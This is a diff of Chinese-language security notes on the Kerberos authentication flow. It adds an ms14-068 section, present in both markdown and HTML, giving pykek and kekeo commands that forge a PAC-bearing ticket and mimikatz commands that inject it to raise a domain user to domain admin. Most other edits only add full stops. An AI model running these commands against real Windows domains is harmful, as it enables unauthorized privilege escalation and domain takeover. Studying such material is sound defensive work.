@@ -27,30 +27,30 @@
 <!-- markdown -->
 ## Kerberos 认证流程
 
-KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server)
+KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server).
 
 一次完整的 Kerberos 请求需要 Client Server KDC 的共同参与, 故称为 Kerberos (三只狗头).
 
 ### KRB\_AS\_REQ
 
-Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息
+Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息.
 
 ### KRB\_AS\_REP
 
-AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket)
+AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket).
 
 ### KRB\_TGS\_REQ
 
-Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS
+Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS.
 
 
 ### KRB\_TGS\_REP
 
-TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和 以 session-key 加密的 session-key-1
+TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和以 session-key 加密的 session-key-1.
 
 ### KRB\_AP\_REQ
 
-Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳
+Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳.
 
 ### KRB\_AP\_REP
 
@@ -58,36 +58,60 @@ Server 通过 Server Hash 解密 TGS Ticket 获得 session-key-1, 之后再次�
 
 ## ms14-068
 
-待补充.
+ms14-068 可将域内普通用户提升至域管理员权限. 其原理为在 Kerberos 认证流程中 Client 可拒绝向 AS 请求 PAC 以构造一份伪造的 PAC 欺骗 TGT. 
+
+### pykek
+
+通过 pykek 利用.
+
+```
+pykek -u <userName>@<domainName> -s <userSid> -d <domainControllerAddr> [-p <clearPassword>|--rc4 <ntlmHash>]
+```
+
+```
+mimikatz "kerberos::ptc ticket.ccache" "exit"
+```
+
+### kekeo
+
+通过 kekeo 利用.
+
+```
+ms14-068 /user:<userName> /domain:<domainName> /dc:<domainControllerAddr> /sid:<userSid> /password:<clearPassword> [/ptt]
+```
+
+```
+mimikatz "kerberos::ptt ticket.kirbi" "exit"
+```
 <!-- markdown end -->
 </xmp>
 <div class="entry" id="main">
 <!-- content -->
 <h2 id="kerberos">Kerberos 认证流程</h2>
 
-<p>KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server)</p>
+<p>KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server).</p>
 
 <p>一次完整的 Kerberos 请求需要 Client Server KDC 的共同参与, 故称为 Kerberos (三只狗头).</p>
 
 <h3 id="krb_as_req">KRB_AS_REQ</h3>
 
-<p>Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息</p>
+<p>Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息.</p>
 
 <h3 id="krb_as_rep">KRB_AS_REP</h3>
 
-<p>AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket)</p>
+<p>AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket).</p>
 
 <h3 id="krb_tgs_req">KRB_TGS_REQ</h3>
 
-<p>Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS</p>
+<p>Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS.</p>
 
 <h3 id="krb_tgs_rep">KRB_TGS_REP</h3>
 
-<p>TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和 以 session-key 加密的 session-key-1</p>
+<p>TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和以 session-key 加密的 session-key-1.</p>
 
 <h3 id="krb_ap_req">KRB_AP_REQ</h3>
 
-<p>Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳</p>
+<p>Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳.</p>
 
 <h3 id="krb_ap_rep">KRB_AP_REP</h3>
 
@@ -95,7 +119,27 @@ Server 通过 Server Hash 解密 TGS Ticket 获得 session-key-1, 之后再次�
 
 <h2 id="ms14068">ms14-068</h2>
 
-<p>待补充.</p>
+<p>ms14-068 可将域内普通用户提升至域管理员权限. 其原理为在 Kerberos 认证流程中 Client 可拒绝向 AS 请求 PAC 以构造一份伪造的 PAC 欺骗 TGT. </p>
+
+<h3 id="pykek">pykek</h3>
+
+<p>通过 pykek 利用.</p>
+
+<pre><code>pykek -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControllerAddr&gt; [-p &lt;clearPassword&gt;|--rc4 &lt;ntlmHash&gt;]
+</code></pre>
+
+<pre><code>mimikatz "kerberos::ptc ticket.ccache" "exit"
+</code></pre>
+
+<h3 id="kekeo">kekeo</h3>
+
+<p>通过 kekeo 利用.</p>
+
+<pre><code>ms14-068 /user:&lt;userName&gt; /domain:&lt;domainName&gt; /dc:&lt;domainControllerAddr&gt; /sid:&lt;userSid&gt; /password:&lt;clearPassword&gt; [/ptt]
+</code></pre>
+
+<pre><code>mimikatz "kerberos::ptt ticket.kirbi" "exit"
+</code></pre>
 <!-- content end -->
 </div>
 <br>
